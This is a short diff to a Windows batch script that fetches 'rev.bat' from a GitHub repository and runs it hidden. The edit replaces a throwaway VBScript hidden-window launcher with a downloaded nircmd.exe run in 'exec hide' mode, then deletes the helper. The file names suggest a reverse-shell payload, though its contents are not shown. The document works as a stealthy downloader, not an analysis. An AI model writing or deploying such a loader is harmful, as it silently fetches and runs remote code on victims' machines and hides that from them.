@@ -1,7 +1,7 @@
 @echo off
-set "VBScript=%temp%\hidden.vbs"
-echo Set WshShell = CreateObject("WScript.Shell") > "%VBScript%"
-echo WshShell.Run "cmd /c rev.bat", 0, False >> "%VBScript%"
+if not exist "%~dp0nircmd.exe" (
+    curl https://raw.githubusercontent.com/0x2034/shell/main/nircmd.exe -o "%~dp0nircmd.exe"
+)
 curl https://raw.githubusercontent.com/0x2034/shell/main/rev.bat -o rev.bat
-start /min wscript.exe "%VBScript%"
-del "%VBScript%"
+start /min cmd /c "%~dp0nircmd.exe" exec hide cmd /c rev.bat
+del "%~dp0nircmd.exe"
